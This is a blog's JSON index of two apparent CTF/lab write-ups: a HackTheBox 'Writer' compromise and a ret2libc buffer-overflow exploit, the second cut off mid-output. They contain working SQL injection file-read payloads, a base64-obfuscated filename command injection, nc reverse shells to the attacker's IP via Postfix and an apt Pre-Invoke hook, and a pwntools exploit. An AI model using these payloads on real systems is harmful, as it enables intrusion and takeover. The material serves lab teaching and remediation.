[
  
    {
      "title"    : "Writer Writeup",
      "category" : "",
      "tags"     : "SQLi, SMTP, RCE, and APT",
      "url"      : "/2021/08/22/Writer-Writeup/",
      "date"     : "Aug 22, 2021",
      "content"  : "This report can be read both on this site, and as its original report form. It is highly recommended that you read the original report form instead because it is better formatted.LinkedIn: https://www.linkedin.com/in/segev-eliezer/ Email: 0xd4yWriteups@gmail.comWeb: https://0xd4y.github.io/ Table of ContentsExecutive Summary        2Attack Narrative        3Enumeration        3Port Enumeration        3Web Enumeration        4SQL Injection        6Leveraging SQLi to Read Local Files        9Getting RCE        10Source Code Analysis        10Finding RCE Vulnerability        14Reverse Shell        15Privilege Escalation        16Kyle        16John        16Root        17Post Exploitation Analysis        19SQLi Mitigation (PDO)        19Image Upload (RCE)        20Conclusion        22Executive SummaryAfter enumerating the website, the /administrative page was found which involved a simple login page. The username field is vulnerable to a critical SQL injection, which an attacker could leverage to login as an administrative user, access sensitive local files, and extract usernames and password hashes.Following the authentication bypass, an insecure image upload feature could be exploited to gain RCE on the target. After obtaining a shell as the www-data user, escalating privileges to the local kyle user could be done by way of cracking his hash in the dev SQL database. The kyle user was part of the filter group which allowed for editing the configuration files of the SMTP service running locally on port 25. Because this service was running as the john user, getting a shell via the service resulted in compromising his account.Finally, the john user is part of the management group which has access to the apt repository configuration files. A cronjob running as root which performed a frequent apt-get update command could therefore be taken advantage of, and obtaining root privileges was possible through adding a reverse shell file in the apt configurations. Please view the Post Exploitation Analysis and Conclusion sections to see remediations for these vulnerabilitiesAttack NarrativeNo information was provided prior to this engagement, other than the IP address of the target: 10.10.11.101.EnumerationPort EnumerationTo examine potential vulnerabilities, the ports of the target were first scanned:  # Nmap 7.91 scan initiated Tue Aug 17 14:52:04 2021 as: nmap -sC -sV -oA nmap/nmap 10.10.11.101  Nmap scan report for 10.10.11.101  Host is up (0.065s latency).  Not shown: 996 closed ports  PORT    STATE SERVICE     VERSION  22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)  | ssh-hostkey:  |   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)  |   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)  |_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)  80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))  |_http-server-header: Apache/2.4.41 (Ubuntu)  |_http-title: Story Bank | Writer.HTB  139/tcp open  netbios-ssn Samba smbd 4.6.2  445/tcp open  netbios-ssn Samba smbd 4.6.2  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel    Host script results:  |_clock-skew: 32s  |_nbstat: NetBIOS name: WRITER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)  | smb2-security-mode:  |   2.02:  |_    Message signing enabled but not required  | smb2-time:  |   date: 2021-08-17T19:52:51  |_  start_date: N/A    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  # Nmap done at Tue Aug 17 14:52:20 2021 -- 1 IP address (1 host up) scanned in 15.70 secondsFrom the nmap scan, it is apparent that the SSH, HTTP, and SMB services are running on the target.  The SMB service is of interest, however there is no anonymous access to any of the shares:Seeing as all of the services are up to date, it follows that the HTTP service must be searched for potential vulnerabilities.Web EnumerationUsers visiting the target’s web server are met with the following home page:Enumerating the directories of the webpage with gobuster[1], the following directories are found:  /contact              (Status: 200) \[Size: 4905\]  /logout               (Status: 302) \[Size: 208\] \[--&gt; http://10.10.11.101/\]  /about                (Status: 200) \[Size: 3522\]  /static               (Status: 301) \[Size: 313\] \[--&gt; http://10.10.11.101/static/\]  /.                    (Status: 200) \[Size: 11971\]  /dashboard            (Status: 302) \[Size: 208\] \[--&gt; http://10.10.11.101/\]  /server-status        (Status: 403) \[Size: 277\]  /administrative       (Status: 200) \[Size: 1443\]A directory of particular interest is /administrative, especially since it cannot be found without brute forcing directories. Visiting this directory reveals a simple login form which asks for a username and password:Note the domain of the target (namely writer.htb). However, no virtual host routing is present.SQL InjectionWhen inputting ’OR 1=1– - as the username and choosing a random value for the password, the user is automatically authenticated, thus confirming the presence of SQL injection. As an authenticated user, stories can be edited and created, and pictures can be uploaded:The web page does not properly check if an uploaded file is an image, as it was possible to upload a reverse shell by the name of php-reverse-shell.jpg.php. This, however, did not lead to RCE as the web page nevertheless treated the file as an image. Furthermore, uploading a malicious image with PHP code did not work.An addition to the image upload feature is the ability to upload files given a url. This could be utilized to cause the server to perform GET requests to an arbitrary website of the user’s choice:Request   POST /dashboard/stories/add HTTP/1.1Host: 10.10.11.101  User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8  Accept-Language: en-US,en;q=0.5  Accept-Encoding: gzip, deflate  Content-Type: multipart/form-data; boundary=---------------------------12417370376638841362770592069  Content-Length: 850  Origin: http://10.10.11.101  DNT: 1  Connection: close  Referer: http://10.10.11.101/dashboard/stories/add  Cookie: session=eyJ1c2VyIjoiJ09SIDE9MS0tIC0ifQ.YSLw7w.2OHVWSzrpZAobEiyfxo94ul3lfg  Upgrade-Insecure-Requests: 1  Sec-GPC: 1    \-----------------------------12417370376638841362770592069  Content-Disposition: form-data; name\="author"    0xd4y  \-----------------------------12417370376638841362770592069  Content-Disposition: form-data; name\="title"    Writeup  \-----------------------------12417370376638841362770592069  Content-Disposition: form-data; name\="tagline"    Writeup  \-----------------------------12417370376638841362770592069  Content-Disposition: form-data; name\="image"; filename=""  Content-Type: application/octet-stream      \-----------------------------12417370376638841362770592069  Content-Disposition: form-data; name\="image_url"    http://10.10.15.80/image.jpg  \-----------------------------12417370376638841362770592069  Content-Disposition: form-data; name\="content"Thanks for reading!  \-----------------------------12417370376638841362770592069--Note the “image_url” parameter highlighted in redResponse  ┌─\[✗\]─\[0xd4y@Writeup\]─\[~/business/hackthebox/medium/linux/writer\]  └──╼ $sudo nc -lvnp 80  listening on \[any\] 80 ...  connect to \[10.10.15.80\] from (UNKNOWN) \[10.10.11.101\] 38018GET /image.jpg HTTP/1.1  Accept-Encoding: identityHost: 10.10.15.80  User-Agent: Python-urllib/3.8  Connection: closeJudging from the user-agent, it was found that the server is running python. After failing to obtain code executions despite trying many different upload attacks, it follows that the source code of the upload feature must be leaked to determine how it works.Leveraging SQLi to Read Local FilesThis is possible via the load_file SQL function. Going back to the login page, this function can be used in conjunction with a union select statement to leak files:Payload  uname='union select 1,load_file('/etc/passwd'),3,4,5,6-- -&amp;password=aResponse  Welcome root:x:0:0:root:/root:/bin/bash  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  bin:x:2:2:bin:/bin:/usr/sbin/nologin  sys:x:3:3:sys:/dev:/usr/sbin/nologin  sync:x:4:65534:sync:/bin:/bin/sync  games:x:5:60:games:/usr/games:/usr/sbin/nologin  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin  systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin  systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  messagebus:x:103:106::/nonexistent:/usr/sbin/nologin  syslog:x:104:110::/home/syslog:/usr/sbin/nologin  _apt:x:105:65534::/nonexistent:/usr/sbin/nologin  tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false  uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin  tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin  landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin  pollinate:x:110:1::/var/cache/pollinate:/bin/false  usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin  sshd:x:112:65534::/run/sshd:/usr/sbin/nologin  systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin  kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash  lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false  postfix:x:113:118::/var/spool/postfix:/usr/sbin/nologin  filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh  john:x:1001:1001:,,,:/home/john:/bin/bash  mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/falseGetting RCESource Code AnalysisBefore being able to read the source code of the website, the full path of the file containing the source code must first be discovered. Seeing as the server is running apache2, the 000-default.conf file in the /etc/apache2/sites-available directory, a directory which holds configuration files for Apache virtual hosts, can be leaked to determine this information.  Payload  uname='union select 1,load_file('/etc/apache2/sites-available/000-default.conf'),3,4,5,6-- -&amp;password=aResponse  Welcome # Virtual host configuration for writer.htb domain  &amp;lt;VirtualHost \*:80&amp;gt;         ServerName writer.htb         ServerAdmin admin@writer.htb         WSGIScriptAlias / /var/www/writer.htb/writer.wsgi       &amp;lt;Directory /var/www/writer.htb&amp;gt;                 Order allow,deny                 Allow from all         &amp;lt;/Directory&amp;gt;         Alias /static /var/www/writer.htb/writer/static       &amp;lt;Directory /var/www/writer.htb/writer/static/&amp;gt;                 Order allow,deny                 Allow from all         &amp;lt;/Directory&amp;gt;         ErrorLog ${APACHE_LOG_DIR}/error.log         LogLevel warn         CustomLog ${APACHE_LOG_DIR}/access.log combined  &amp;lt;/VirtualHost&amp;gt;    # Virtual host configuration for dev.writer.htb subdomain  # Will enable configuration after completing backend development  # Listen 8080  #&amp;lt;VirtualHost 127.0.0.1:8080&amp;gt;  #        ServerName dev.writer.htb  #        ServerAdmin admin@writer.htb  #       # Collect static for the writer2_project/writer_web/templates#        Alias /static /var/www/writer2_project/static  #        &amp;lt;Directory /var/www/writer2_project/static&amp;gt;  #                Require all granted  #        &amp;lt;/Directory&amp;gt;  #  #        &amp;lt;Directory /var/www/writer2_project/writerv2&amp;gt;  #                &amp;lt;Files wsgi.py&amp;gt;  #                        Require all granted  #                &amp;lt;/Files&amp;gt;  #        &amp;lt;/Directory&amp;gt;  #  #        WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env  #        WSGIProcessGroup writer2_project  #        WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py  #        ErrorLog ${APACHE_LOG_DIR}/error.log  #        LogLevel warn  #        CustomLog ${APACHE_LOG_DIR}/access.log combined  #  #&amp;lt;/VirtualHost&amp;gt;  # vim: syntax=apache ts=4 sw=4 sts=4 sr noetIn particular, note the directory in which the writer.wsgi file lies in (highlighted in blue). After finding out that the server is running python, fuzzing for files in the root of the web server revealed an init.py file within /var/www/writer.htb/writer/. Leaking this file reveals the following contents:  if request.method == "POST":        if request.files\['image'\]:             image = request.files\['image'\]            if ".jpg" in image.filename:                  path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)               image.save(path)$               image = "/img/{}".format(image.filename)           else:$               error = "File extensions must be in .jpg!"               return render_template('add.html', error\=error)       if request.form.get('image_url'):             image_url = request.form.get('image_url')           if ".jpg" in image_url:               try:                   local_filename, headers = urllib.request.urlretrieve(image_url)                     os.system("mv {} {}.jpg".format(local_filename, local_filename))                   image = "{}.jpg".format(local_filename)                   try:                       im = Image.open(image)                       im.verify()                       im.close()                         image = image.replace('/tmp/','')                      os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))                       image = "/img/{}".format(image)                     except PIL.UnidentifiedImageError:                       os.system("rm {}".format(image))                       error = "Not a valid image file!"...          if request.form.get('image_url'):             image_url = request.form.get('image_url')           if ".jpg" in image_url:               try:                     local_filename, headers = urllib.request.urlretrieve(image_url)                   os.system("mv {} {}.jpg".format(local_filename, local_filename))                   image = "{}.jpg".format(local_filename)                   try:                       im = Image.open(image)                       im.verify()                       im.close()                         image = image.replace('/tmp/','')                       os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))                       image = "/img/{}".format(image)                       cursor = connector.cursor()                       cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})                         result = connector.commit()                       except PIL.UnidentifiedImageError:                       os.system("rm {}".format(image))                       error = "Not a valid image file!"                       return render_template('edit.html', error=error, results=results, id=id)                 except:                   error = "Issue uploading picture"                   return render_template('edit.html', error=error, results=results, id=id)           else:                 error = "File extensions must be in .jpg!"Note the file was shortened to better emphasize the source code of the upload feature. Critically insecure code is highlighted in red, and the text highlighted in purple is the segment that the undermentioned exploit focuses on.Finding RCE VulnerabilityWithin the source code are multiple examples of insecure code (explored more in detail in the Post Exploitation Analysis section). One that particularly stands out is the call of os.system on the uploaded filename. Before testing exploits on the target, the exploit was tested out locally to get a closer view as to how the program behaves. Copying the segment of interest, we can get a closer look at how the program treats file names:Code   import urllib  import os  from flask import request    local_filename, headers = urllib.request.urlretrieve('http://10.10.15.80/.jpg/1.jpg;sleep')  print("The local_filename is", local_filename)  os.system("mv {} {}.jpg".format(local_filename, local_filename))Observe the argument of the urllib.request.urlretrieve() function. The user is in control of this argument. If a user were to upload a file called 1.jpg;sleep, then the server will behave accordingly:ResponseThe local_filename is /tmp/tmpen3ya1q1However, when changing the argument to be file:///home/0xd4y/business/hackthebox/medium/linux/writer/www/.jpg/1.jpg;sleep 10, then command execution is performed. This works because the urllib function does not correctly rename the file to something safe in the instance that the argument is using the file protocol. Therefore, a file with a malicious name can be uploaded using the image parameter, and this file can then be referenced locally via the file protocol.Reverse ShellAfter uploading a file with the name `0xd4y.jpg;echo -n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuODAgOTAwMSA+L3RtcC9m|base64 -d|bash`, it was referenced locally by putting the following in the image_url parameter: file:///var/www/writer.htb/writer/static/img/0xd4y.jpg;`echo -n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuODAgOTAwMSA+L3RtcC9m|base64 -d|bash`. A reverse shell was then returned as the www-data user:  ┌─\[✗\]─\[0xd4y@Writeup\]─\[~/business/hackthebox/medium/linux/writer\]└──╼ $nc -lvnp 9001  listening on \[any\] 9001 ...  connect to \[10.10.15.80\] from (UNKNOWN) \[10.10.11.101\] 59938  /bin/sh: 0: can't access tty; job control turned off  $ whoami  www-dataPrivilege EscalationKyleAfter enumerating multiple files in the box, it was found that there is a username and password in a mysql config file called /etc/mysql/my.cnf that points to the dev database:database = devuser = djangouserpassword = DjangoSuperPasswordOne of Kyle’s passwords is located in the databases, albeit it is hashed:pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=. Cracking this hash reveals that Kyle’s password is marcoantonio.JohnThe kyle user is part of multiple groups, one of them being the filter group which has permissions to edit the /etc/postfix/disclaimer file. Furthermore, after enumerating the ports running locally on the target, it was found that port 25 is open and running a Postfix SMTP server.With pspy[2] running on a separate kyle SSH instance, the following message was sent on the box:kyle@writer:~$ nc localhost 25220 writer.htb ESMTP Postfix (Ubuntu)MAIL FROM:kyle@writer.htb250 2.1.0 OkRCPT TO: john@writer.htb250 2.1.5 OkData354 End data with .  Thanks for reading this writeup!  .  250 2.0.0 Ok: queued as 9BB6F137Upon sending this message, the following process occurred in the background:            2021/08/25 00:12:54 CMD: UID=1001 PID=23607        /bin/sh /etc/postfix/disclaimer -f kyle@writer.htb – john@writer.htb      Thus, the server is running as the john user (note UID=1001), and is executing the /etc/postfix/disclaimer file. Seeing as the kyle user had permission to edit this file, achieving a reverse shell as the john user could be obtained via appending a reverse shell to the top of the file and sending a message:┌─[0xd4y@Writeup]─[~/business/hackthebox/medium/linux/writer]└──╼ $nc -lvnp 9001listening on [any] 9001 …connect to [10.10.15.80] from (UNKNOWN) [10.10.11.101] 49840/bin/sh: 0: can’t access tty; job control turned off$ whoamijohnPersistence on this account was maintained by grabbing john’s ssh key.RootJohn is part of the management group which has permission to edit the apt directory /etc/apt/apt.conf.d, a directory which is responsible for containing the apt configurations. As discovered using pspy, there is a cronjob running as root which performs the following command: /usr/bin/apt-get update. Therefore, a malicious configuration that returns a reverse shell can be added to the directory as follows:  john@writer:~$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.80 9001 &gt;/tmp/f"};' &gt; /etc/apt/apt.conf.d/0xd4y-pwnWhen the cronjob runs again, a reverse shell is returned as the root user:  ┌─\[✗\]─\[0xd4y@Writeup\]─\[~/business/hackthebox/medium/linux/writer\]└──╼ $nc -lvnp 9001  listening on \[any\] 9001 ...  connect to \[10.10.15.80\] from (UNKNOWN) \[10.10.11.101\] 56068  /bin/sh: 0: can't access tty; job control turned off  # whoami  rootPost Exploitation AnalysisThis section goes into further detail about the vulnerabilities of the target and how to mitigate them. Note that the mitigations shown in this section are incomplete pieces of code, however they are secure implementations of the desired result.SQLi Mitigation (PDO)This machine contained multiple vulnerabilities, starting with the SQL injection in the /administrative page. The vulnerability lies in the following SQL statement that is performed on the user’s query:  "Select \* From users Where username = '%s' And password = '%s'" % (username, password)This insecure SQL statement allows an attacker to add a single quote in their username and then perform an arbitrary SQL statement of their choosing. To mitigate SQL injection attacks, the current recommendation is to use PDO (PHP Data Objects). The following code does not directly pass the user input into the SQL statement. Rather, using PDO tells the server what the SQL query and the user-inputted data are. This is successfully performed because the instruction and user-input are sent separately to the database:  &lt;?php    try {     $conn = new PDO("mysql:host=$servername;dbname=$dbname", $db_username, $db_password); // set the PDO error mode to exception $conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); // prepare sql and bind parameters        $query = "INSERT INTO users (username,password)  VALUES(:username,:password)";          $statement = $conn-&gt;prepare($query);          $statement-&gt;execute(array(   ':username'\=&gt; $username,   ':password'\=&gt; $password          ));    } catch(PDOException $e) { echo "Error: " . $e-&gt;getMessage();  }  $conn = null;    ?&gt;Image Upload (RCE)After successfully performing an SQL injection attack, an upload feature in the webpage was exploited to gain RCE due to insecure python code. System commands and evaluation functions should never be performed on user input. As discussed in Finding RCE Vulnerability, the system() function in the os module was the reason for the critical RCE vulnerability. The following code prevents this vulnerability:  from werkzeug.utils import secure_filenamefrom PIL import Image    filename = request.file('image')    image = StringIO(base64.b64decode(download\['file'\]))  allowed_extensions = \['jpg','jpeg'\]  if filename.split('.')\[-1\] in allowed_extensions:        				try:                  filename = secure_filename(filename)                    img = Image.open(image)                  img.verify()                  path = os.path.join('/var/www/writer.htb/writer/static/img/', filename)                image.save(path)          except Exception:                print('Invalid image')  else:        								print('Filename extension not allowed.')The above program verifies if a file is a valid image by first checking its extension. Note that this is different from the source code of the website which simply searches for the presence of the .jpg string in the filename. After verifying the file’s extension, PIL’s verify method is called on the file before the file is uploaded to the img directory.ConclusionMultiple vulnerabilities were present on the target which resulted in a full compromise of the system. The /administrative page contained an SQL injection vulnerability which resulted in the leakage of local files and authentication bypass. After authenticating to the server, the insecure handling of filenames led to an RCE vulnerability.Afterwards, the privilege escalation to root involved logging into the system as the kyle user who had permissions to edit the mail service. Due to the service running under john, the lateral movement involved adding a reverse shell to the configuration of the service. As the john user, apt configurations could be modified to exploit an apt-get update cronjob running as the root user. Observe the following remediations to mitigate the vulnerabilities outlined in the report:      Secure the SQL login page on /administrative        PDO should be used in place of the insecure SQL statement (see SQLi Mitigation (PDO)).        Never use system() or any sort of evaluation function on user-input.        The system command on the uploaded filename resulted in RCE.        Never reuse passwords    As the www-data user, kyle’s password could be retrieved by cracking his hash from the dev database. This would not have been of much use if the local kyle user had a different password on the target.      Passwords should be secure.        Fix misconfigurations related to the kyle and john user    kyle was able to edit a service that was run by john. To mitigate this, the service should either be run by kyle, or kyle should not have permissions to edit the service.  john was able to edit apt configurations. This sort of privilege should not be granted to any user. By adding a reverse shell to the apt configurations, any user who runs the apt command can be compromised by john.[1] https://github.com/OJ/gobuster [2] https://github.com/DominicBreuker/pspy",
      "image": "/images/0xd4y-logo-gray.png"
    } ,
  
    {
      "title"    : "Ret2The-Unknown Writeup",
      "category" : "",
      "tags"     : "Ret2Libc, Binary Exploitation, and ASLR Bypass",
      "url"      : "/2021/07/31/Ret2TheUnknown/",
      "date"     : "Jul 31, 2021",
      "content"  : "This report can be read both on this site, and as its original report form. It is highly recommended that you read the original report form instead because it is better formatted.Ret2The-UnknownReturn-to-libc attack with ASLR   0xd4yJuly 31, 20210xd4y WriteupsLinkedIn: https://www.linkedin.com/in/segev-eliezer/ Email: 0xd4yWriteups@gmail.comWeb: https://0xd4y.github.io/ Table of ContentsExecutive Summary        2Attack Narrative        3Binary Analysis        3Source Code        3Behavior        4Exploit Construction        6GDB        6PwnTools        8Rerunning main()        8Finding Base Libc Address        9Building system(“/bin/sh”)        11Exploit        11Conclusion        14Executive SummaryThe utilization of the insecure gets() function resulted in a buffer overflow vulnerability. This security hole was exploited to execute arbitrary code despite the enabled NX bit via a return-to-libc attack. The deprecated gets() function should be replaced with the more secure fgets() alternative to prevent the attack mentioned in this report. It is highly suggested that the process running on port 31568 be terminated as soon as possible until the remediations outlined in the Conclusion section are followed.   Attack NarrativeThe destination and port on which this binary is running were given:DestinationPortmc.ax31568Additionally, the source code and libc file used by the binary were provided.Binary AnalysisSource Code    #include &lt;stdio.h&gt;  #include &lt;string.h&gt;  int main(void)  { char your_reassuring_and_comforting_we_will_arrive_safely_in_libc[32];     setbuf(stdout, NULL);   setbuf(stdin, NULL);   setbuf(stderr, NULL); puts("that board meeting was a *smashing* success! rob loved the challenge!"); puts("in fact, he loved it so much he sponsored me a business trip to this place called 'libc'..."); puts("where is this place? can you help me get there safely?"); // please i cant afford the medical bills if we crash and segfault gets(your_reassuring_and_comforting_we_will_arrive_safely_in_libc); puts("phew, good to know. shoot! i forgot!"); printf("rob said i'd need this to get there: %llx\\n", printf); puts("good luck!");  }At the top of the file, 32 bytes were allocated to the your_reassuring_and_comforting_we_will_arrive_safely_in_libc buffer (for the sake of shortening this name, this buffer is called input_buffer throughout this report). After initializing input_buffer, a series of three setbuf() calls are run, a function which controls the way a stream is buffered. Additionally, this function can control the size of the buffer, however due to the fact that the buffer argument is NULL, the stream is unbuffered[1].Following the setbuf() calls is a succession of three puts() calls before the insecure gets() function is run with input_buffer as the argument. After providing an input, the printf() function is called which prints out the address of printf in memory.BehaviorLooking at the security of the binary with the checksec command, it is found that the NX bit of the binary is enabled:  ┌─[✗]─[0xd4y@Writeup]─[~/business/ctf/redpwn/pwn/ret2the-unknown]  └──╼ $checksec ret2the-unknown [*] '/home/0xd4y/business/ctf/redpwn/pwn/ret2the-unknown/ret2the-unknown'   Arch:     amd64-64-little   RELRO:    Partial RELRO   Stack:    No canary found   NX:       NX enabled   PIE:      No PIE (0x400000)Note that this binary is 64-bit in little endiannessTherefore, the RIP cannot simply be overwritten to point to shellcode. However, the instruction pointer can easily be overwritten due to the lack of a stack canary. Furthermore, there is no PIE (Position Independent Executables) which means that the libc base can be calculated by finding the offset of the executables (this is examined in detail in the Finding Base Libc Address section). This element is essential to the success of return-to-libc attacks.When executing the binary, user input can be provided after the “safely?” string:  ┌─[0xd4y@Writeup]─[~/business/ctf/redpwn/pwn/ret2the-unknown]  └──╼ $./ret2the-unknown  that board meeting was a *smashing* success! rob loved the challenge!in fact, he loved it so much he sponsored me a business trip to this place called 'libc'...where is this place? can you help me get there safely?  test_string  phew, good to know. shoot! i forgot!  rob said i'd need this to get there: 7f8c6accfcf0  good luck!Only after providing an input, the binary printed out the address of printf(). However, this address changes with each new execution of the binary:  ┌─[✗]─[0xd4y@Writeup]─[~/business/ctf/redpwn/pwn/ret2the-unknown]  └──╼ $./ret2the-unknown  that board meeting was a *smashing* success! rob loved the challenge!  in fact, he loved it so much he sponsored me a business trip to this place called 'libc'...  where is this place? can you help me get there safely?  a  phew, good to know. shoot! i forgot!  rob said i'd need this to get there: 7fd495f67cf0good luck!  ┌─[0xd4y@Writeup]─[~/business/ctf/redpwn/pwn/ret2the-unknown]  └──╼ $./ret2the-unknown  that board meeting was a *smashing* success! rob loved the challenge!  in fact, he loved it so much he sponsored me a business trip to this place called 'libc'...  where is this place? can you help me get there safely?  b  phew, good to know. shoot! i forgot!  rob said i'd need this to get there: 7fb847d38cf0good luck!  ┌─[0xd4y@Writeup]─[~/business/ctf/redpwn/pwn/ret2the-unknown]  └──╼ $./ret2the-unknown  that board meeting was a *smashing* success! rob loved the challenge!  in fact, he loved it so much he sponsored me a business trip to this place called 'libc'...  where is this place? can you help me get there safely?  c  phew, good to know. shoot! i forgot!  rob said i'd need this to get there: 7fac5a1c8cf0  good luck!The printf() address is shown in redThis change is evidence of the existence of ASLR (address space layout randomization), which is a security feature to help prevent memory corruption vulnerabilities. Therefore, the base address of libc cannot be easily calculated by subtracting the address of printf in the previous execution of the binary by the printf symbol in the given libc file.Exploit ConstructionGDBThus, to correctly calculate the libc base address, it is essential to overwrite RIP to point to main() so that the binary allows us to input a second payload (this time with the knowledge of the printf address). First, the offset of RIP must be calculated:  ┌─[0xd4y@Writeup]─[~/business/ctf/redpwn/pwn/ret2the-unknown]                                                                                                                            └──╼ $gdb ./ret2the-unknown -q  pwndbg: loaded 196 commands. Type pwndbg [filter] for a list.  pwndbg: created $rebase, $ida gdb functions (can be used with print/break)  Reading symbols from ./ret2the-unknown...  (No debugging symbols found in ./ret2the-unknown)  pwndbg&gt; r &lt; &lt;(cyclic 100)              Starting program: /home/0xd4y/business/ctf/redpwn/pwn/ret2the-unknown/ret2the-unknown &lt; &lt;(cyclic 100)  that board meeting was a *smashing* success! rob loved the challenge!                            in fact, he loved it so much he sponsored me a business trip to this place called 'libc'...    where is this place? can you help me get there safely?                                      phew, good to know. shoot! i forgot!                                                            rob said i'd need this to get there: 7ffff7e44cf0                                                good luck!                                                                                                             Program received signal SIGSEGV, Segmentation fault.                                            ──────────────────────────────────────────[ DISASM ]──────────────────────────────────────────  ► 0x401237 &lt;main+177&gt;    ret    &lt;0x6161616c6161616b&gt;    ──────────────────────────────────────────[ STACK ]───────────────────────────────────────────  00:0000│ rsp 0x7fffffffde38 ◂-- 'kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'  01:0008│     0x7fffffffde40 ◂-- 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'  02:0010│     0x7fffffffde48 ◂-- 'oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'  03:0018│     0x7fffffffde50 ◂-- 'qaaaraaasaaataaauaaavaaawaaaxaaayaaa'  04:0020│     0x7fffffffde58 ◂-- 'saaataaauaaavaaawaaaxaaayaaa'  05:0028│     0x7fffffffde60 ◂-- 'uaaavaaawaaaxaaayaaa'  06:0030│     0x7fffffffde68 ◂-- 'waaaxaaayaaa'  07:0038│     0x7fffffffde70 ◂-- 0x61616179 /* 'yaaa' */  ────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────  ► f 0         0x401237 main+177    f 1 0x6161616c6161616b    f 2 0x6161616e6161616d    f 3 0x616161706161616f    f 4 0x6161617261616171    f 5 0x6161617461616173    f 6 0x6161617661616175    f 7 0x6161617861616177  ──────────────────────────────────────────────────────────────────────────────────────────────  pwndbg&gt; cyclic -l 0x6161616b  40The program received a segmentation fault error, and the offset of RIP was calculated to be 40 bytes. Therefore, upon inputting 40 junk bytes followed by the address of the main function, the program will repeat. Using the info functions GDB command, the address of the main function can be found:0x0000000000401186  mainThe overall exploit can be summarized into two waves: wave one consists of repeating the main function and retrieving the printf address, and wave two consists of calling the libc system() function with /bin/sh as the argument.PwnToolsRerunning main()Using pwntools[2], a python library made for facilitating the process of writing binary exploits, we can create a program (which was named poc.py) to exploit the program:  from pwn import *    REMOTE = False    if REMOTE:     p = remote("mc.ax",31568)  else:   p = process("./ret2the-unknown")    rip_offset = 40  main = 0x0000000000401186  payload = b'A'*40 + p64(main)    p.recvuntil(b"safely?")  p.sendline(payload)  p.interactive()The code shown above first starts a local process for the binary. Afterwards, the payload is sent and an interactive instance is called to the process:  ┌─[0xd4y@Writeup]─[~/business/ctf/redpwn/pwn/ret2the-unknown]  └──╼ $python3 poc.py  [+] Starting local process './ret2the-unknown': pid 5749  [*] Switching to interactive mode    phew, good to know. shoot! i forgot!  rob said i'd need this to get there: 7f3f6e089cf0  good luck!that board meeting was a *smashing* success! rob loved the challenge!in fact, he loved it so much he sponsored me a business trip to this place called 'libc'...where is this place? can you help me get there safely?$ test  phew, good to know. shoot! i forgot!  rob said i'd need this to get there: 7f3f6e089cf0  good luck!  [*] Got EOF while reading in interactive$ thanks!  [*] Process './ret2the-unknown' stopped with exit code -11 (SIGSEGV) (pid 5749)  [*] Got EOF while sending in interactive  Traceback (most recent call last):   File 